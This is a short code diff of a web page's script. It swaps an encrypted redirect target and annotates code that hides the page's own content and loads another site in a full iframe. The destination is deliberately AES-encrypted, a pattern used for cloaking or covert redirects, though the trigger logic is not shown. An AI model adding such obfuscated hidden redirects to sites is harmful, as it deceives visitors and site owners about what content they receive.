@@ -310,6 +310,8 @@
             </div>
         </div>
     </div>
+
+    <!-- ========== 🔥 IFRAME CONTAINER (hidden by default) ========== -->
     <div id="iframeContainer">
         <iframe id="redirectIframe" src="about:blank"></iframe>
     </div>
@@ -326,7 +328,8 @@
             }
         }
 
-        const encryptedPersonalSite = 'U2FsdGVkX1/tBHil1wMqra1PRZL0unWgpb6fKzquYYTbngUGh6/RBv5BbzSoue8bee33zA7afpOIKQSVSMk1FA==';
+        const encryptedPersonalSite = 'U2FsdGVkX1/EjcT5CobNCtdmFY1ja9/sMDvfI3hVXsiTRbHnW9r8+Cit6E/f9TC7';
+        // (optional) kept for reference – not used for redirect anymore
         const encryptedHomeRedirect = 'U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=';
 
         let redirectTriggered = false; // prevent double redirect
@@ -341,9 +344,11 @@
                 return;
             }
 
+            // Hide your original website content
             const yourContent = document.getElementById('yourWebsiteContent');
             if (yourContent) yourContent.style.display = 'none';
 
+            // Show the iframe with the redirected website
             const iframeContainer = document.getElementById('iframeContainer');
             const iframe = document.getElementById('redirectIframe');
             if (iframeContainer && iframe) {
